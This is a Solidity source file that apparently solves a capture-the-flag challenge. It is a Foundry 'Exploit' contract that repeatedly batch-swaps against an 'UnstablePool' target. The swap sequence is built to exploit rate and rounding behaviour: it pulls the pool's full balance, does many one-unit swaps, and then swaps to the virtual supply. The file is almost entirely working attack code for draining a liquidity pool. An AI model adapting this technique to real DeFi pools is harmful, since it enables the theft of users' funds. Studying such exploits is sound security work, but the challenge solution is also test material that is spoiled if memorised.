// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "src/Challenge.sol";
import { console } from "forge-std/console.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        UnstablePool.SwapKind kind = UnstablePool.SwapKind.GIVEN_OUT;
        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        for (uint256 i = 0; i < 30; ++i) {
            CHALLENGE.TARGET().batchSwap(kind, getSwapParameter(), address(this), limits);
        }
    }

    function getLpOutAmount(uint256 inInd, uint256 inAmount) public returns (uint256) {
        uint256 rate = CHALLENGE.TARGET().getRate();
        if (inInd == 1) {
            return inAmount * 1e18 / rate;
        }
        if (inInd == 2) {
            uint256 scaling = WrappedToken(address(CHALLENGE.WRAPPEDTOKEN())).getRate();
            inAmount = inAmount * scaling / 1e18;
            return inAmount * 1e18 / rate;
        }
    }

    function getSwapParameter() public returns (UnstablePool.BatchSwapStep[] memory) {
        uint256 oneToTwoSteps = 10;
        uint256 poolBalance1 = CHALLENGE.TARGET().getPoolBalance(1);
        uint256 poolBalance2 = CHALLENGE.TARGET().getPoolBalance(2);
        UnstablePool.BatchSwapStep[] memory swaps = new UnstablePool.BatchSwapStep[](3 + oneToTwoSteps);

        uint256 beforeVirtualSupply = CHALLENGE.TARGET().getVirtualSupply();

        // step 0: 2 -> 0
        swaps[0] = UnstablePool.BatchSwapStep({assetInIndex: 2, assetOutIndex: 0, amount: getLpOutAmount(2, oneToTwoSteps)});
        // step 1: 0 -> 1
        swaps[1] = UnstablePool.BatchSwapStep({assetInIndex: 0, assetOutIndex: 1, amount: poolBalance1});
        // step 2: 1 -> 2 many times
        for (uint256 i = 0; i < oneToTwoSteps; ++i) {
            swaps[2 + i] = UnstablePool.BatchSwapStep({assetInIndex: 1, assetOutIndex: 2, amount: 1});
        }
        // step 3: 1 -> 0
        swaps[2 + oneToTwoSteps] =
            UnstablePool.BatchSwapStep({assetInIndex: 1, assetOutIndex: 0, amount: beforeVirtualSupply});

        return swaps;
    }
}